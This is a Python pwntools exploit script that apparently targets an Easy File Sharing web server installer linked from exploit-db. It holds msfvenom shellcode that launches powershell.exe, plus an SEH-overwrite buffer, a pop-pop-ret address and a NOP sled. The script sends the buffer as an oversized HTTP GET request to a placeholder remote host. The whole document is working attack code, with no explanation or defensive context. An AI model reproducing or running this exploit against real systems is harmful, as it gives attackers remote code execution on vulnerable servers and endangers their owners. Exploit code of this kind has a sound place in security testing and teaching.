from pwn import *

# https://www.exploit-db.com/apps/60f3ff1f3cd34dec80fba130ea481f31-efssetup.exe

size = 5000

# msfvenom -p windows/exec CMD=powershell.exe -f python -v shellcode -b '\x00\x0a\x0d\x20\x25\x2f\x5c'
shellcode =  b""
shellcode += b"\xbb\x75\xfa\xea\xf1\xdb\xc5\xd9\x74\x24\xf4"
shellcode += b"\x5a\x29\xc9\xb1\x32\x31\x5a\x15\x83\xea\xfc"
shellcode += b"\x03\x5a\x11\xe2\x80\x06\x02\x73\x6a\xf7\xd3"
shellcode += b"\x14\xe3\x12\xe2\x14\x97\x57\x55\xa5\xdc\x3a"
shellcode += b"\x5a\x4e\xb0\xae\xe9\x22\x1c\xc0\x5a\x88\x7a"
shellcode += b"\xef\x5b\xa1\xbe\x6e\xd8\xb8\x92\x50\xe1\x72"
shellcode += b"\xe7\x91\x26\x6e\x05\xc3\xff\xe4\xbb\xf4\x74"
shellcode += b"\xb0\x07\x7e\xc6\x54\x0f\x63\x9f\x57\x3e\x32"
shellcode += b"\xab\x01\xe0\xb4\x78\x3a\xa9\xae\x9d\x07\x60"
shellcode += b"\x44\x55\xf3\x73\x8c\xa7\xfc\xdf\xf1\x07\x0f"
shellcode += b"\x1e\x35\xaf\xf0\x55\x4f\xd3\x8d\x6d\x94\xa9"
shellcode += b"\x49\xf8\x0f\x09\x19\x5a\xf4\xab\xce\x3c\x7f"
shellcode += b"\xa7\xbb\x4b\x27\xa4\x3a\x98\x53\xd0\xb7\x1f"
shellcode += b"\xb4\x50\x83\x3b\x10\x38\x57\x22\x01\xe4\x36"
shellcode += b"\x5b\x51\x47\xe6\xf9\x19\x6a\xf3\x70\x40\xe1"
shellcode += b"\x02\x07\xfe\x47\x04\x17\x01\xf8\x6d\x26\x8a"
shellcode += b"\x97\xea\xb7\x59\xdc\x05\xf2\xc0\x75\x8e\x5a"
shellcode += b"\x91\xc7\xd3\x5d\x4f\x0b\xea\xdd\x7a\xf4\x09"
shellcode += b"\xfd\x0e\xf1\x56\xba\xe3\x8b\xc7\x2e\x04\x3f"
shellcode += b"\xe7\x7b\x74\xd0\x60\xe6\x07\x5d\xe7\x8d\x8b"
shellcode += b"\xcd\xd9\x28\x2c\x6b\x26"

junk = b"A" * 4061
nseh = b"\xeb\x06\x90\x90"
seh = p32(0x100103fe) # pop pop ret (findjmp.exe ImageLOad.dll esi)
nops = b"\x90" * 30
padding = b"\x90" * (size - len(junk+nseh+seh+nops+shellcode))

buffer = junk + nseh + seh + nops + shellcode + padding

payload = b"GET "
payload += buffer
payload += b" HTTP/1.0\r\n"

s = remote('IP',80)
s.send(payload)
s.close()
